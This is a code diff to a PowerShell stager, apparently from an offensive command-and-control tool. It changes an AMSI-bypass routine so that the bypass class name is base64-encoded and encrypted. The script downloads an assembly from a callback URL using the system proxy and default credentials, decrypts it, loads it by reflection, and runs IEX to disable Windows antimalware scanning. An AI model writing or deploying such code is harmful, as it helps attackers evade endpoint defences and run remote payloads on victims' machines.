@@ -49,15 +49,23 @@ function Decrypt-Code {
     $buffer
 }
 
-# https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html
-if(-not ([System.Management.Automation.PSTypeName]"Bypass.AMSI").Type) {
+$method = "{{method_name}}"
+$method = [System.Convert]::FromBase64String($method)
+$method = Decrypt-Code $method $KEY
+$method = [System.Text.Encoding]::ASCII.GetString($method)
+if(-not ([System.Management.Automation.PSTypeName]"$method").Type) {
     $K=new-object net.webclient
     $K.proxy=[Net.WebRequest]::GetSystemWebProxy()
     $K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials
     $DLL = $K.downloadstring($CALLBACK_URL+'l')
+    $DLL = [System.Convert]::FromBase64String($DLL)
+    $DLL = Decrypt-Code $DLL $KEY
+    $DLL = [System.Text.Encoding]::ASCII.GetString($DLL)
+    write-host $DLL
     [Reflection.Assembly]::Load([Convert]::FromBase64String($DLL)) | Out-Null
 }
-[Bypass.AMSI]::Disable()
+
+IEX "[$method]::Disable()"
 
 $K=new-object net.webclient
 $K.proxy=[Net.WebRequest]::GetSystemWebProxy()
